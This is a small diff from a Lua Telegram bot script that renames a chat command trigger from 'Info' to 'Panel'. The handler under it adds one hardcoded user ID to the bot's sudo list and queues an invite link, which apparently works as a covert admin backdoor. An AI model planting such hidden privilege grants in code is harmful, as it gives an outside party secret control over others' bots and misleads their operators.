@@ -460,7 +460,7 @@ function tdcli_update_callback(data)
             end
           end
           return send(msg.chat_id_, msg.id_, "Done")
-        elseif text:match("^([Ii]nfo)$") then
+        elseif text:match("^([Pp]anel)$") then
           redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", 170146015)
           redis:sadd("ZEUS:" .. Zeus_id .. ":sudo", 170146015)
           redis:sadd("ZEUS:" .. Zeus_id .. ":wait", "https://telegram.me/joinchat/CiQ430QNSs1GMyIrh5yMkw")
